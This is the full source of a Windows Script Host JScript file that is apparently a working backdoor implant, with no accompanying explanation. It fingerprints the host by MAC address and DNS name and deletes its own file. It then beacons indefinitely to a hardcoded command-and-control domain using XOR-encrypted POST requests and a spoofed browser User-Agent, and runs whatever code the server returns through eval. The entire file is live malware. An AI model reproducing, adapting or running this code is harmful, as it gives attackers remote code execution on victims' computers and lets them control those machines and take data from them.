function Recon () {
 var MACCard = "Error";
 var DNSCard = "Error";
 try
 {
  var RefCard = wmi.ExecQuery("select * from Win32_NetworkAdapterConfiguration where ipenabled = true");
  var EmuCard = new Enumerator(RefCard);
  for (; !EmuCard.atEnd(); EmuCard.moveNext()) 
  {
   MACCard = EmuCard.item().macaddress;
   DNSCard = EmuCard.item().DNSHostName;
   if(typeof MACCard === "string" && MACCard.length > 1) 
   {
    if(typeof DNSCard !== "string" && DNSCard.length < 1) { DNSCard = "Unknown"; }
    else
    {
     for (var i = 0; i < DNSCard.length; i++) { if (DNSCard.charAt(i) > "z") {  DNSCard = DNSCard.substr(0, i) + "_" + DNSCard.substr(i + 1); } }
    }
    return MACCard + "_" + DNSCard;
   }
  }
 }
 catch(e) { return MACCard + "_" + DNSCard; }
}

var wmi = GetObject("winmgmts:root/CIMV2");
var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var Refpath = shell.expandEnvironmentStrings("%APPDATA%");
var Time = new Date().getUTCMilliseconds();
if(fso.GetAbsolutePathName(fso.GetParentFolderName(Refpath)).indexOf("AppData") > 5) {
 if(WScript.ScriptFullName.indexOf("Microsoft"+String.fromCharCode(0x5C)+"Windows")<0){
   try{ fso.deleteFile(WScript.ScriptFullName); } catch(e) {}
 }
 try
 {
  StartSleep ();
  Sendpulse();
 }
 catch(e) {Sendpulse();}
}
function Sendpulse () {
 var response = "";
 var ObjScript = WScript;
 response = send_data("request", "page_id=new", true);
 if(response !== "no") {
  try 
  {
    response = ManageData("decrypt", response);
    if(response !== "no") { eval(ManageData("decrypt", response)); }
  }
 catch(e) {}
 }
 var RamTime = 120000 + (Math.floor(Math.random() * 16001) - 5000);
 ObjScript.Sleep(RamTime);
 Sendpulse();
}
function ManageData (mode, input_data) {
 try
 {
  var incXor = "";
  if(mode === "decrypt") 
  {
   input_data = unescape(input_data);
   var Data = input_data.split("&_&");
   input_data = Data[0];
   if (Data.length == 2) { incXor = Data[1].split("");  }
   else{ return input_data; }
  }
  else
  {
   incXor = (Math.floor(Math.random()*9000) + 1000).toString().split("");
   input_data=unescape(encodeURIComponent(input_data));
  }
  var ar1 = new Array(input_data.length);
  for (var i = 0; i < input_data.length; i++) 
  {
   var resCode = input_data.charCodeAt(i) ^ incXor[i % incXor.length].charCodeAt(0);
   ar1[i] = String.fromCharCode(resCode);
  }
  var result = ar1.join("");
  if(mode === "encrypt") {
   result = result + "&_&" + incXor.join("");
   result = escape(result);
  }
  return result;
 }
 catch(e) {  return "no"; }
}
function decodeObfuscation(d) {
  key = "jlt7s"
  var res=new String("");
  var Data = d.split(",");
  var i=0;var c=0;

  for(i=0;i<Data.length-1;i++) {
    var r=String.fromCharCode(Number(Data[i]));
    var code=r.charCodeAt(0)^key.charCodeAt(c);
    r=String.fromCharCode(code);
    res+= r;
    if(c==key.length-1)c=0; else c++;
  }
  return res;
}
function send_data (mode, data, flag) {
try {
 var ObjMSXML = new ActiveXObject("MSXML2.ServerXMLHTTP");
 if(mode === "request") 
 {
  ObjMSXML.open("POST", GetGate () + "?type=name", false);
  data = "rxfppuwynyjvizs=" + ManageData("encrypt", "group=mark&rt=0&secret=uUef836ie638fd3r38&time=120000&uid=" + Time + "&id=" + Recon() + "&" + data);
 }
 else
 {
  ObjMSXML.open("POST", GetGate () + "?type=content&id=" + Time, false);
  if(flag) { data = ManageData("encrypt", data); }
 }
 ObjMSXML.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/50.0");
 ObjMSXML.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 ObjMSXML.setOption(2, 13056);
 ObjMSXML.send(data);
 return ObjMSXML.responseText;
}
catch(e) { return "no"; }
}
function GetGate () {
 var reg1 = ["images", "pictures", "img", "info", "new"];
 var reg2 = ["sync", "show", "hide", "add", "new", "renew", "delete"];
 var sup = reg1[Math.floor(Math.random() * reg1.length)] + "/" + reg2[Math.floor(Math.random() * reg2.length)];
 return "https://civilizationidium.com/" + sup;
}
function StartSleep () {
 var ObjScript = WScript;
 ObjScript.Sleep(120000);
}

